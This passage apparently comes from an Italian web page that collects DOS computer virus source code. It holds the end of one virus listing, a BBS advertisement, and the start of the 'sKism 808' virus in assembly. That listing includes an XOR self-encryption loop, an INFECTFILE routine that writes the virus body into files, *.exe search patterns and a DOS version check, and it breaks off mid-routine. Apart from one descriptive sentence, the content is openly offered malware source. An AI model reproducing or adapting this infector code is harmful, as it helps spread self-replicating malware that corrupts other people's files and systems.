style="mso-spacerun: yes">     </span>dx,offset currentdir<span
style="mso-spacerun: yes">      </span>;back to original<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span></span></b><b><span
lang=DE style='mso-fareast-font-family:"MS Mincho";mso-ansi-language:DE'>int<span
style="mso-spacerun: yes">     </span>21h<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=DE style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:DE'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=DE style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:DE'>Abort:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=DE style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:DE'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=DE style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:DE'><span style="mso-spacerun: yes">     </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";mso-ansi-language:EN-US'>mov<span
style="mso-spacerun: yes">     </span>ax,4c00h<span style="mso-spacerun:
yes">                  </span>;end program<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>int<span
style="mso-spacerun: yes">     </span>21h<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>main<span style="mso-spacerun: yes">     </span>endp<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>code<span style="mso-spacerun: yes">     </span>ends<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        
</span>end<span style="mso-spacerun: yes">      </span>main<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ&gt; and Remember Don't Forget
to Call &lt;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>; ÄÄÄÄÄÄÄÄÄÄÄÄ&gt; ARRESTED DEVELOPMENT +31.79.426o79
H/P/A/V/AV/? &lt;ÄÄÄÄÄÄÄÄÄÄ<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:red;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:red'>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<h1><a name="_5._Virus_sKism"></a><span lang=EN-US style='mso-fareast-font-family:
"MS Mincho";color:red'>5. Virus sKism 808:<o:p></o:p></span></h1>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#B32D9D'><span style="mso-spacerun: yes"> </span>è praticamente
la fotocopia del precedente, con qualche piccola modifica nella routine di
decrittazione.<o:p></o:p></span></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;tHE sKISM 808 vIRUS.<span style="mso-spacerun: yes"> 
</span>cREATED 1991 BY sMART kIDS iNTO sICK mETHODS.<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>FILENAME<span style="mso-spacerun: yes">  
</span>equ<span style="mso-spacerun: yes">      </span>30<span
style="mso-spacerun: yes">                 </span>;USED TO FIND FILE NAME<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>FILEATTR<span style="mso-spacerun: yes">  
</span>equ<span style="mso-spacerun: yes">  </span><span style="mso-spacerun:
yes">    </span>21<span style="mso-spacerun: yes">                 </span>;USED
TO FIND FILE ATTRIBUTES<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>FILEDATE<span style="mso-spacerun: yes">  
</span>equ<span style="mso-spacerun: yes">      </span>24<span
style="mso-spacerun: yes">                 </span>;USED TO FIND FILE DATE<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>FILETIME<span style="mso-spacerun: yes">  
</span>equ<span style="mso-spacerun: yes">      </span>22<span
style="mso-spacerun: yes">                 </span>;USED TO FIND FILE TIME<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>CODE_START equ<span style="mso-spacerun: yes">     
</span>0100H<span style="mso-spacerun: yes">              </span>;START OF ALL
.com FILES<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>VIRUS_SIZE equ<span style="mso-spacerun: yes">     
</span>808<span style="mso-spacerun: yes">                </span>;tr 808<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:FR'>CODE<span style="mso-spacerun: yes">    
</span>SEGMENT<span style="mso-spacerun: yes">  </span>'CODE'<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:FR'>ASSUME<span style="mso-spacerun: yes">  
</span>CS:CODE,DS:CODE,ES:CODE<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:FR'><span style="mso-spacerun: yes">         </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";mso-ansi-language:EN-US'>ORG<span
style="mso-spacerun: yes">      </span>CODE_START<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>MAIN PROC<span style="mso-spacerun: yes">  
</span>NEAR<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>JMP<span style="mso-spacerun: yes">   
</span>VIRUS_START<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>ENCRYPT_VAL<span style="mso-spacerun: yes">   
</span>DB<span style="mso-spacerun: yes">     </span>00H<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>VIRUS_START:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>CALL<span
style="mso-spacerun: yes">     </span>ENCRYPT<span style="mso-spacerun:
yes">                  </span>;ENCRYPT/DECRYPT FILE<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>JMP<span
style="mso-spacerun: yes">      </span>VIRUS<span style="mso-spacerun:
yes">                    </span>;GO TO START OF CODE<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'>ENCRYPT:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>PUSH<span style="mso-spacerun: yes">     </span>CX<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">      </span>BX,OFFSET VIRUS_CODE<span
style="mso-spacerun: yes">     </span>; inizio crittazione<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'>XOR_LOOP:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">      </span>CH,[BX]<span style="mso-spacerun:
yes">                  </span>; legge byte corrente<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style="mso-spacerun: yes">     </span>XOR<span
style="mso-spacerun: yes">     </span><span style="mso-spacerun:
yes"> </span>CH,ENCRYPT_VAL<span style="mso-spacerun: yes">           </span>;
critta con chiave a byte<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>MOV<span style="mso-spacerun: yes">      </span>[BX],CH<span
style="mso-spacerun: yes">                  </span>; salva byte criptato<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style="mso-spacerun: yes">     </span>INC<span
style="mso-spacerun: yes">      </span>BX<span style="mso-spacerun:
yes">                       </span>; va al byte successivo<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style="mso-spacerun: yes">     </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#B32D9D;mso-ansi-language:
EN-US'>CMP<span style="mso-spacerun: yes">      </span>BX,OFFSET
VIRUS_CODE+VIRUS_SIZE<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                 </span><span style="mso-spacerun:
yes">      </span>; abbiamo finito ?<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span></span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>JLE<span style="mso-spacerun: yes">      </span>XOR_LOOP<span
style="mso-spacerun: yes">                 </span>; no ? continua<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style="mso-spacerun: yes">     </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#B32D9D;mso-ansi-language:
EN-US'>POP<span style="mso-spacerun: yes">      </span>CX<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>RET<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>INFECTFILE:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>DX,CODE_START<span style="mso-spacerun:
yes">             </span>;WHERE VIRUS STARTS IN MEMORY<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>BX,HANDLE<span style="mso-spacerun:
yes">                 </span>;LOAD BX WITH HANDLE<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>PUSH<span
style="mso-spacerun: yes">    </span>BX<span style="mso-spacerun:
yes">                        </span>;SAVE HANDLE ON STACK<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>CALL<span
style="mso-spacerun: yes">    </span>ENCRYPT<span style="mso-spacerun:
yes">                   </span>;ENCRYPT FILE<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>POP<span
style="mso-spacerun: yes">     </span>BX<span style="mso-spacerun:
yes">                        </span>;GET BACK BX<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>CX,VIRUS_SIZE<span style="mso-spacerun:
yes">             </span>;NUMBER OF BYTES TO WRITE<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>AH,40H<span style="mso-spacerun:
yes">           </span><span style="mso-spacerun: yes">         </span>;WRITE
TO FILE<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>INT<span
style="mso-spacerun: yes">     </span>21H<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>PUSH<span
style="mso-spacerun: yes">    </span>BX<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>CALL<span
style="mso-spacerun: yes">    </span>ENCRYPT<span style="mso-spacerun:
yes">                   </span>;FIX UP THE MESS<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span></span></b><b><span
lang=FR style='mso-fareast-font-family:"MS Mincho";mso-ansi-language:FR'>POP<span
style="mso-spacerun: yes">     </span>BX<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:FR'><span style="mso-spacerun: yes">     </span>RET<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:FR'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>VIRUS_CODE:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>WILDCARDS<span style="mso-spacerun: yes">   
</span>DB<span style="mso-spacerun: yes">     </span>&quot;*&quot;,0<span
style="mso-spacerun: yes">              </span>;SEARCH FOR DIRECTORY ARGUMENT<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>FILESPEC<span style="mso-spacerun: yes">  </span><span
style="mso-spacerun: yes">   </span>DB<span style="mso-spacerun: yes">    
</span>&quot;*.exe&quot;,0<span style="mso-spacerun: yes">         
</span>;SEARCH FOR exe FILE ARGUMENT<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>FILESPEC2<span style="mso-spacerun: yes">   
</span>DB<span style="mso-spacerun: yes">     </span>&quot;*.*&quot;,0<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>ROOTDIR<span style="mso-spacerun: yes">     
</span>DB<span style="mso-spacerun: yes">     </span>&quot;\&quot;,0<span
style="mso-spacerun: yes">              </span>;ARGUMENT FOR ROOT DIRECTORY<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>DIRDATA<span style="mso-spacerun: yes">     
</span>DB<span style="mso-spacerun: yes">     </span>43 DUP (?)<span
style="mso-spacerun: yes">         </span>;HOLDS DIRECTORY dta<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>FILEDATA<span style="mso-spacerun: yes">    
</span>DB<span style="mso-spacerun: yes">     </span>43 DUP (?)<span
style="mso-spacerun: yes">         </span>;HOLDS FILES dta<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>DISKDTASEG<span style="mso-spacerun: yes">  
</span>DW<span style="mso-spacerun: yes">     </span>?<span
style="mso-spacerun: yes">                  </span>;HOLDS DISK DTA SEGMENT<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>DISKDTAOFS<span style="mso-spacerun: yes">  
</span>DW<span style="mso-spacerun: yes">     </span>?<span
style="mso-spacerun: yes">                  </span>;HOLDS DISK DTA OFFSET<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>TEMPOFS<span style="mso-spacerun: yes">     
</span>DW<span style="mso-spacerun: yes">     </span>?<span
style="mso-spacerun: yes">                  </span>;HOLDS OFFSET<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>TEMPSEG<span style="mso-spacerun: yes">     
</span>DW<span style="mso-spacerun: yes">     </span>?<span
style="mso-spacerun: yes">                  </span>;HOLDS SEGMENT<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>DRIVECODE<span style="mso-spacerun: yes">   
</span>DB<span style="mso-spacerun: yes">     </span>?<span
style="mso-spacerun: yes">                  </span>;HOLDS DRIVE CODE<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>CURRENTDIR<span style="mso-spacerun: yes">  
</span>DB<span style="mso-spacerun: yes">     </span>64 DUP (?)<span
style="mso-spacerun: yes">         </span>;SAVE CURRENT DIRECTORY INTO THIS<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>HANDLE<span style="mso-spacerun: yes">      
</span>DW<span style="mso-spacerun: yes">     </span>?<span
style="mso-spacerun: yes">                  </span>;HOLDS FILE HANDLE<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>ORIG_TIME<span style="mso-spacerun: yes">   
</span>DW<span style="mso-spacerun: yes">     </span>?<span
style="mso-spacerun: yes">                  </span>;HOLDS FILE TIME<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>ORIG_DATE<span style="mso-spacerun: yes">   
</span>DW<span style="mso-spacerun: yes">     </span>?<span
style="mso-spacerun: yes">                  </span>;HOLDS FILE DATE<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>ORIG_ATTR<span style="mso-spacerun: yes">   
</span>DW<span style="mso-spacerun: yes">     </span>?<span
style="mso-spacerun: yes">                  </span>;HOLDS FILE ATTR<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>IDBUFFER<span style="mso-spacerun: yes">    
</span>DW<span style="mso-spacerun: yes">     </span>2 DUP<span
style="mso-spacerun: yes">  </span>(?)<span style="mso-spacerun: yes">        
</span>;HOLDS VIRUS ID<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>VIRUS:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      </span>MOV<span
style="mso-spacerun: yes">    </span>AX,3000H<span style="mso-spacerun:
yes">                  </span>;GET DOS VERSION<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      </span>INT<span
style="mso-spacerun: yes">    </span>21H<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    </span><span
style="mso-spacerun: yes">  </span>CMP<span style="mso-spacerun: yes">   
</span>AL,02H<span style="mso-spacerun: yes">                    </span>;IS IT
AT LEAST 2.00?<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      </span>JB<span
style="mso-spacerun: yes">     </span>BUS1<span style="mso-spacerun:
yes">                      </span>;WON'T INFECT LESS THAN 2.00<o:p></o:p></span></b></p>

